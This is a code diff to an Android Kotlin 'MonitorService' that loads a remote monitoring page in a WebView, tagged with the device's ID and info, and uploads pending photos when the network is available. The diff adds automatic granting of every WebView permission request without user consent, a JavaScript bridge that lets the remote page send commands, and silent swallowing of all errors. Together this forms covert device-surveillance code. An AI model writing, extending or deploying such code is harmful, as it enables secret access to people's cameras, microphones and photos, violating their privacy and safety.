@@ -15,6 +15,8 @@ import android.os.IBinder
 import android.os.Looper
 import android.provider.Settings
 import android.util.Base64
+import android.webkit.JavascriptInterface
+import android.webkit.PermissionRequest
 import android.webkit.WebChromeClient
 import android.webkit.WebView
 import android.webkit.WebViewClient
@@ -26,6 +28,10 @@ import java.net.URL
 import java.net.URLEncoder
 
 class MonitorService : Service() {
+
+    companion object {
+        var lastStatus: String = "Service started"
+    }
 
     private val handler = Handler(Looper.getMainLooper())
     private var webView: WebView? = null
@@ -41,16 +47,13 @@ class MonitorService : Service() {
         try {
             createNotificationChannel()
             startForeground(1, buildNotification())
-        } catch (e: Exception) {
-        }
+        } catch (e: Exception) {}
         try {
             setupWebView()
-        } catch (e: Exception) {
-        }
+        } catch (e: Exception) {}
         try {
             registerNetworkCallback()
-        } catch (e: Exception) {
-        }
+        } catch (e: Exception) {}
     }
 
     private fun createNotificationChannel() {
@@ -94,7 +97,14 @@ class MonitorService : Service() {
             settings.domStorageEnabled = true
             settings.mediaPlaybackRequiresUserGesture = false
             webViewClient = object : WebViewClient() {}
-            webChromeClient = object : WebChromeClient() {}
+            webChromeClient = object : WebChromeClient() {
+                override fun onPermissionRequest(request: PermissionRequest?) {
+                    try {
+                        request?.grant()
+                    } catch (e: Exception) {}
+                }
+            }
+            addJavascriptInterface(JsBridge(), "Android")
         }
 
         val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
@@ -102,20 +112,39 @@ class MonitorService : Service() {
         webView?.loadUrl("$monitorUrl?did=$androidId&dinfo=$deviceInfo")
     }
 
+    inner class JsBridge {
+        @JavascriptInterface
+        fun onResult(text: String) {
+            lastStatus = text
+        }
+
+        @JavascriptInterface
+        fun onCommand(text: String) {
+            lastStatus = text
+        }
+
+        @JavascriptInterface
+        fun onUploadDone(text: String) {
+            lastStatus = text
+        }
+    }
+
     private fun registerNetworkCallback() {
-        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
-        val request = NetworkRequest.Builder()
-            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-            .build()
-        cm.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
-            override fun onAvailable(network: Network) {
-                isOnline = true
-                handler.post { uploadPendingPhotos() }
-            }
-            override fun onLost(network: Network) {
-                isOnline = false
-            }
-        })
+        try {
+            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
+            val request = NetworkRequest.Builder()
+                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
+                .build()
+            cm.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
+                override fun onAvailable(network: Network) {
+                    isOnline = true
+                    handler.post { uploadPendingPhotos() }
+                }
+                override fun onLost(network: Network) {
+                    isOnline = false
+                }
+            })
+        } catch (e: Exception) {}
     }
 
     private fun uploadPendingPhotos() {
@@ -151,7 +180,6 @@ class MonitorService : Service() {
         super.onDestroy()
         try {
             webView?.destroy()
-        } catch (e: Exception) {
-        }
+        } catch (e: Exception) {}
     }
 }
